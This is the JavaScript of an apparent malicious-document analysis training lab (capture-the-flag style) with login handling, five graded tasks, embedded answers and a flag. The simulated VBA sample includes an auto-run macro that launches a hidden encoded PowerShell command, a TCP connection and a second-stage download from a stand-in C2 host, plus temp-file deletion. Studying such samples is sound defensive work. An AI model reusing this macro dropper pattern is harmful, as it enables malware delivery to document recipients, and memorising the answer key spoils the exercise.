<script>
  (function() {
    // ============ STORAGE KEYS ============
    const ADMIN_PASS_KEY = 'maldoc_admin_pass_v2';
    const STUDENT_PASS_KEY = 'maldoc_student_pass_v2';
    const STUDENTS_DB_KEY = 'maldoc_students_db_v2';
    const INITIALIZED_KEY = 'maldoc_initialized_v2';

    // ============ DEFAULT VALUES ============
    const DEFAULT_ADMIN_PASS = 'admin123';
    const DEFAULT_STUDENT_PASS = 'maldoc2025';

    // ============ INITIALIZATION ============
    function initializeStorage() {
      if (!localStorage.getItem(INITIALIZED_KEY)) {
        if (!localStorage.getItem(ADMIN_PASS_KEY)) {
          localStorage.setItem(ADMIN_PASS_KEY, DEFAULT_ADMIN_PASS);
        }
        if (!localStorage.getItem(STUDENT_PASS_KEY)) {
          localStorage.setItem(STUDENT_PASS_KEY, DEFAULT_STUDENT_PASS);
        }
        if (!localStorage.getItem(STUDENTS_DB_KEY)) {
          localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify([]));
        }
        localStorage.setItem(INITIALIZED_KEY, 'true');
      }
    }
    initializeStorage();

    // ============ STATE ============
    let currentUser = null;
    let adminActive = false;
    let vbaCodeRevealed = false;

    // ============ TASKS ============
    const tasks = [
      { id: 1, title: "🔍 Task 1: Extract Macros with olevba", desc: "Use olevba to analyze resume.docm. Which auto-execute macro is found? (function name)", answer: "AutoOpen", extra: "olevba" },
      { id: 2, title: "⚠️ Task 2: Identify Malicious VBA Code", desc: "In the VBA editor, which dangerous Shell command executes PowerShell? (exact command starting with 'Shell')", answer: 'Shell("powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0AIgAsACAANAA0ADMAKQA7AA==")', extra: "vba" },
      { id: 3, title: "🔓 Task 3: Decode Base64 Payload", desc: "Decode the base64 string in the Shell command. What domain does it connect to?", answer: "malicious-c2.example.com", extra: "decode" },
      { id: 4, title: "🌐 Task 4: Extract Payload URL", desc: "What is the full URL where the second stage payload is downloaded?", answer: "http://malicious-c2.example.com/payload.exe", extra: "url" },
      { id: 5, title: "📊 Task 5: Document IOCs", desc: "List the document's MD5 hash (format: 'domain,hash' without spaces)", answer: "malicious-c2.example.com,a1b2c3d4e5f6789012345678abcdef01", extra: "iocs" }
    ];

    // ============ SIMULATED DATA ============
    const docHash = "a1b2c3d4e5f6789012345678abcdef01";
    const c2Domain = "malicious-c2.example.com";
    const payloadUrl = `http://${c2Domain}/payload.exe`;
    const base64Payload = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0AIgAsACAANAA0ADMAKQA7AA==";
    const decodedPayload = `$client = New-Object System.Net.Sockets.TCPClient("${c2Domain}", 443);`;

    const olevbaOutput = `
    [olevba 0.60.2 - http://decalage.info/python/oletools]
    Analyzing: resume.docm
    
    ┌─────────────────────────────────────────────────────┐
    │ MACRO DETECTION SUMMARY                             │
    ├─────────────────────────────────────────────────────┤
    │ AutoOpen() - Auto-execute on document open          │
    │ Workbook_Open() - Auto-execute on workbook open     │
    │ Document_Close() - Triggered on close               │
    └─────────────────────────────────────────────────────┘
    
    VBA Macros found: 3
    Suspicious keywords: Shell, powershell, Base64Decode, 
                         TCPClient, New-Object, DownloadFile
    Risk rating: HIGH (0.95/1.0)
    
    ⚠️ WARNING: AutoOpen() contains Shell execution!
    `;

    const vbaCode = `
<span class="vba-keyword">Option Explicit</span>

<span class="vba-keyword">Private Sub</span> <span class="vba-function">AutoOpen</span>()
    <span class="vba-comment">' Auto-execute macro - runs when document opens</span>
    <span class="vba-keyword">Dim</span> cmd <span class="vba-keyword">As String</span>
    <span class="vba-keyword">Dim</span> objShell <span class="vba-keyword">As Object</span>
    
    <span class="vba-comment">' Obfuscated PowerShell command with base64</span>
    cmd = <span class="vba-string">"powershell -enc "</span> & _
          <span class="vba-string">"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMA"</span> & _
          <span class="vba-string">"dABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4A"</span> & _
          <span class="vba-string">"dAAoACIAbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBlAHgAYQBtAHAAbABlAC4A"</span> & _
          <span class="vba-string">"YwBvAG0AIgAsACAANAA0ADMAKQA7AA=="</span>
    
    <span class="vba-keyword">Set</span> objShell = <span class="vba-function">CreateObject</span>(<span class="vba-string">"WScript.Shell"</span>)
    <span class="vba-danger">objShell.Run cmd, 0, False</span>  <span class="vba-comment">' HIDE WINDOW!</span>
    
    <span class="vba-comment">' Download second stage</span>
    <span class="vba-keyword">Dim</span> http <span class="vba-keyword">As Object</span>
    <span class="vba-keyword">Set</span> http = <span class="vba-function">CreateObject</span>(<span class="vba-string">"MSXML2.ServerXMLHTTP"</span>)
    http.Open <span class="vba-string">"GET"</span>, <span class="vba-string">"${payloadUrl}"</span>, <span class="vba-keyword">False</span>
    http.Send
<span class="vba-keyword">End Sub</span>

<span class="vba-keyword">Private Sub</span> <span class="vba-function">Workbook_Open</span>()
    <span class="vba-comment">' Secondary trigger</span>
    <span class="vba-function">AutoOpen</span>
<span class="vba-keyword">End Sub</span>

<span class="vba-keyword">Private Sub</span> <span class="vba-function">Document_Close</span>()
    <span class="vba-comment">' Cleanup routine</span>
    <span class="vba-function">Kill</span> <span class="vba-string">"C:\\Users\\*\\AppData\\Local\\Temp\\*.exe"</span>
<span class="vba-keyword">End Sub</span>
    `;

    // ============ HELPERS ============
    function getStudents() {
      try { return JSON.parse(localStorage.getItem(STUDENTS_DB_KEY) || '[]'); }
      catch(e) { return []; }
    }
    
    function saveStudents(arr) { 
      localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify(arr)); 
    }
    
    function getStudentPassword() { 
      return localStorage.getItem(STUDENT_PASS_KEY) || DEFAULT_STUDENT_PASS; 
    }
    
    function getAdminPassword() { 
      return localStorage.getItem(ADMIN_PASS_KEY) || DEFAULT_ADMIN_PASS; 
    }

    function showToast(message, isError = false) {
      const existingToast = document.querySelector('.toast');
      if (existingToast) existingToast.remove();
      
      const toast = document.createElement('div');
      toast.className = 'toast';
      toast.style.background = isError ? '#3a1a1a' : '#0a1a30';
      toast.style.borderColor = isError ? '#aa3030' : '#4dc8e8';
      toast.style.color = isError ? '#ffaaaa' : '#d0e8f0';
      toast.textContent = message;
      document.body.appendChild(toast);
      
      setTimeout(() => {
        if (toast.parentNode) toast.remove();
      }, 3000);
    }

    function updateCompletion(name, taskId) {
      let students = getStudents();
      let s = students.find(s => s.name.toLowerCase() === name.toLowerCase());
      if (s && !s.completedTasks.includes(taskId)) {
        s.completedTasks.push(taskId);
        saveStudents(students);
        if (currentUser && currentUser.name.toLowerCase() === name.toLowerCase()) {
          currentUser.completedTasks = [...s.completedTasks];
        }
        return true;
      }
      return false;
    }

    // ============ VBA EDITOR ============
    function createVBAEditor() {
      let html = '<p style="color:#80c8e0; margin-bottom:0.5rem;">📝 VBA Macro Code (click to reveal full code):</p>';
      html += '<div class="vba-editor" id="vbaEditor">';
      html += '<div style="text-align:center; padding:2rem;">';
      html += '<button onclick="revealVBACode()" style="font-size:1rem;">🔍 Click to Reveal VBA Code</button>';
      html += '<p style="color:#888; margin-top:0.5rem;">Analyze the macros to find malicious code</p>';
      html += '</div>';
      html += '</div>';
      return html;
    }

    window.revealVBACode = function() {
      vbaCodeRevealed = true;
      const editor = document.getElementById('vbaEditor');
      if (editor) {
        editor.innerHTML = vbaCode;
        editor.style.textAlign = 'left';
        editor.style.padding = '1rem';
        showToast('📝 VBA code revealed! Analyze for malicious content.');
      }
    };

    // ============ RENDER ============
    function renderTasks() {
      if (!currentUser) return;
      document.getElementById('displayStudentName').innerText = currentUser.name;
      const container = document.getElementById('taskContainer');
      const completed = currentUser.completedTasks || [];
      
      let html = '<h3 style="margin-bottom:1rem;">📄 Malicious Document Analysis Workstation</h3>';
      
      // VBA Editor
      html += createVBAEditor();

      // olevba output
      html += '<div class="tool-output">';
      html += '<p style="color:#00ff88;">$ olevba resume.docm</p>';
      html += `<pre style="white-space:pre-wrap;">${olevbaOutput}</pre>`;
      html += '</div>';

      tasks.forEach(task => {
        const done = completed.includes(task.id);
        html += `<div class="task-card" style="border-left-color: ${done ? '#2ecc71' : '#4dc8e8'}; animation-delay: ${task.id * 0.1}s;">`;
        html += `<strong>${task.title}</strong> <span class="badge">${done ? '✅ Complete' : '🔒 Pending'}</span>`;
        html += `<p style="margin:0.4rem 0;">${task.desc}</p>`;

        if (task.extra === 'olevba') {
          html += '<div class="log-line">📋 olevba detected auto-execute macro. Check the summary above.</div>';
        } else if (task.extra === 'vba') {
          html += '<div class="log-line">⚠️ Look for Shell() execution with encoded PowerShell in the VBA code.</div>';
        } else if (task.extra === 'decode') {
          html += '<div class="tool-output">';
          html += '<p style="color:#00ff88;">Decoded Base64 Payload:</p>';
          html += `<pre style="white-space:pre-wrap; color:#ffd700;">${decodedPayload}</pre>`;
          html += '</div>';
          html += '<div class="log-line">🔍 Extract the C2 domain from the decoded TCP connection string.</div>';
        } else if (task.extra === 'url') {
          html += '<div class="log-line">🌐 The VBA code downloads a second stage from a URL. Find it in the VBA code.</div>';
        } else if (task.extra === 'iocs') {
          html += '<div class="log-line">📊 Compile Indicators of Compromise:</div>';
          html += '<div class="log-line">• C2 Domain: ' + c2Domain + '</div>';
          html += '<div class="log-line">• Document MD5: ' + docHash + '</div>';
          html += '<div class="log-line">• Payload URL: ' + payloadUrl + '</div>';
        }

        if (!done) {
          html += `<div style="display:flex; gap:0.5rem; align-items:center; margin-top:0.5rem;">`;
          html += `<input type="text" id="answerInput${task.id}" placeholder="Your answer" style="flex:1;">`;
          html += `<button onclick="submitTask(${task.id})">✅ Submit</button>`;
          html += `</div>`;
        } else {
          html += `<p style="color:#9effb7; font-weight:bold;">✔ Task Completed Successfully</p>`;
        }
        html += '</div>';
      });

      if (completed.length === tasks.length) {
        html += '<div class="flag-box" style="animation: glowGold 1.7s infinite, fadeIn 0.5s ease;">';
        html += '🏆 FLAG{MALICIOUS_MACRO} 🏆';
        html += '</div>';
        html += '<p style="text-align:center; color:#ffd700; margin-top:0.5rem;">🎉 Successfully analyzed the malicious document!</p>';
      }
      
      container.innerHTML = html;
      
      // Restore VBA code if it was already revealed
      if (vbaCodeRevealed) {
        setTimeout(() => {
          const editor = document.getElementById('vbaEditor');
          if (editor && editor.querySelector('button')) {
            revealVBACode();
          }
        }, 100);
      }
    }

    window.submitTask = function(taskId) {
      if (!currentUser) return;
      const input = document.getElementById(`answerInput${taskId}`);
      if (!input) return;
      const ans = input.value.trim();
      const task = tasks.find(t => t.id === taskId);
      if (!task) return;
      
      let isCorrect = false;
      
      if (taskId === 2) {
        // Flexible matching for Shell command
        const lowerAns = ans.toLowerCase();
        isCorrect = lowerAns.startsWith('shell(') && lowerAns.includes('powershell') && lowerAns.includes('-enc');
      } else if (taskId === 5) {
        // IOC format checking
        const parts = ans.split(',');
        isCorrect = parts.length === 2 && 
                   parts[0].toLowerCase() === c2Domain && 
                   parts[1].toLowerCase() === docHash;
      } else {
        isCorrect = ans.toLowerCase() === task.answer.toLowerCase();
      }
      
      if (isCorrect) {
        const wasNew = updateCompletion(currentUser.name, taskId);
        if (wasNew) {
          showToast('✅ Correct! Task completed successfully.');
        } else {
          showToast('ℹ️ Task was already completed.');
        }
        renderTasks();
      } else {
        showToast('❌ Incorrect answer. Review the analysis results carefully.', true);
        input.style.animation = 'shake 0.5s ease';
        setTimeout(() => { input.style.animation = ''; }, 500);
      }
    };

    function renderAdminList() {
      const students = getStudents();
      const cont = document.getElementById('adminStudentList');
      if (!cont) return;
      
      document.getElementById('currentStudentPassDisplay').textContent = getStudentPassword();
      document.getElementById('currentAdminPassDisplay').textContent = getAdminPassword();
      
      if (students.length === 0) {
        cont.innerHTML = '<p style="color:#80b8d0;">📭 No students have logged in yet.</p>';
        return;
      }
      
      let html = '<table><tr><th>Student Name</th><th>Tasks Completed</th><th>Progress</th><th>Status</th></tr>';
      students.forEach(s => {
        const cnt = (s.completedTasks || []).length;
        const percentage = Math.round((cnt / tasks.length) * 100);
        const statusColor = cnt === tasks.length ? '#2ecc71' : cnt > 0 ? '#f39c12' : '#e74c3c';
        html += `<tr>
          <td>${escapeHtml(s.name)}</td>
          <td>${cnt} / ${tasks.length}</td>
          <td>
            <div style="background:#0a1a25; border-radius:10px; height:8px; width:100px; overflow:hidden;">
              <div style="width:${percentage}%; height:100%; background:${statusColor}; transition: width 0.3s;"></div>
            </div>
          </td>
          <td><span class="status-indicator" style="background:${statusColor};"></span>${cnt === tasks.length ? 'Flag Obtained' : cnt > 0 ? 'In Progress' : 'Not Started'}</td>
        </tr>`;
      });
      html += '</table>';
      cont.innerHTML = html;
    }

    function escapeHtml(t) { 
      return String(t).replace(/[&<>"]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[m]); 
    }

    // ============ VIEW SWITCHING ============
    function showLogin() {
      document.getElementById('loginSection').classList.remove('hidden');
      document.getElementById('studentDashboard').classList.add('hidden');
      document.getElementById('adminDashboard').classList.add('hidden');
      document.getElementById('studentLoginForm').classList.add('hidden');
      document.getElementById('adminLoginForm').classList.add('hidden');
      currentUser = null; 
      adminActive = false;
    }

    function showStudentDash() {
      document.getElementById('loginSection').classList.add('hidden');
      document.getElementById('studentDashboard').classList.remove('hidden');
      document.getElementById('adminDashboard').classList.add('hidden');
      vbaCodeRevealed = false;
      renderTasks();
    }

    function showAdminDash() {
      document.getElementById('loginSection').classList.add('hidden');
      document.getElementById('studentDashboard').classList.add('hidden');
      document.getElementById('adminDashboard').classList.remove('hidden');
      renderAdminList();
    }

    // ============ EVENT LISTENERS ============
    document.addEventListener('DOMContentLoaded', ()=>{
      document.getElementById('studentLoginBtn').addEventListener('click', ()=>{
        document.getElementById('studentLoginForm').classList.remove('hidden');
        document.getElementById('adminLoginForm').classList.add('hidden');
      });
      
      document.getElementById('adminLoginBtn').addEventListener('click', ()=>{
        document.getElementById('adminLoginForm').classList.remove('hidden');
        document.getElementById('studentLoginForm').classList.add('hidden');
      });

      document.getElementById('studentSubmitLogin').addEventListener('click', ()=>{
        const name = document.getElementById('studentNameInput').value.trim();
        const pass = document.getElementById('studentPassInput').value.trim();
        
        if(!name || !pass) {
          showToast('Please enter both name and password.', true);
          return;
        }
        
        if(pass !== getStudentPassword()) {
          showToast('Invalid student batch password.', true);
          return;
        }
        
        let students = getStudents();
        let stu = students.find(s => s.name.toLowerCase() === name.toLowerCase());
        if(!stu) { 
          stu = {name, completedTasks: []}; 
          students.push(stu); 
          saveStudents(students);
          showToast(`Welcome, ${name}! New profile created.`);
        } else {
          showToast(`Welcome back, ${name}!`);
        }
        
        currentUser = {name: stu.name, completedTasks: [...stu.completedTasks]};
        document.getElementById('studentNameInput').value = '';
        document.getElementById('studentPassInput').value = '';
        showStudentDash();
      });

      document.getElementById('adminSubmitLogin').addEventListener('click', ()=>{
        const pass = document.getElementById('adminPassInput').value.trim();
        if(pass === getAdminPassword()){
          adminActive = true; 
          document.getElementById('adminPassInput').value = ''; 
          showToast('Admin access granted.');
          showAdminDash();
        } else {
          showToast('Invalid admin password.', true);
        }
      });

      document.getElementById('logoutStudentBtn').addEventListener('click', ()=>{
        showToast('Logged out successfully.');
        showLogin();
      });
      
      document.getElementById('logoutAdminBtn').addEventListener('click', ()=>{
        showToast('Admin logged out.');
        showLogin();
      });

      document.getElementById('updateStudentPasswordBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        const np = document.getElementById('newStudentPassword').value.trim();
        if(!np) {
          showToast('Please enter a new password.', true);
          return;
        }
        localStorage.setItem(STUDENT_PASS_KEY, np);
        showToast('✅ Student password updated successfully!');
        document.getElementById('newStudentPassword').value = '';
        renderAdminList();
      });

      document.getElementById('updateAdminPasswordBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        const np = document.getElementById('newAdminPassword').value.trim();
        if(!np) {
          showToast('Please enter a new admin password.', true);
          return;
        }
        localStorage.setItem(ADMIN_PASS_KEY, np);
        showToast('✅ Admin password changed successfully!');
        document.getElementById('newAdminPassword').value = '';
        renderAdminList();
      });

      document.getElementById('resetAllProgressBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        if (confirm('⚠️ Are you sure you want to reset ALL student progress? This cannot be undone.')) {
          saveStudents([]);
          showToast('All student progress has been reset.');
          renderAdminList();
        }
      });

      // Add shake animation
      const style = document.createElement('style');
      style.textContent = `
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-10px); }
          75% { transform: translateX(10px); }
        }
      `;
      document.head.appendChild(style);

      showLogin();
    });
  })();
</script>
</body>
</html>
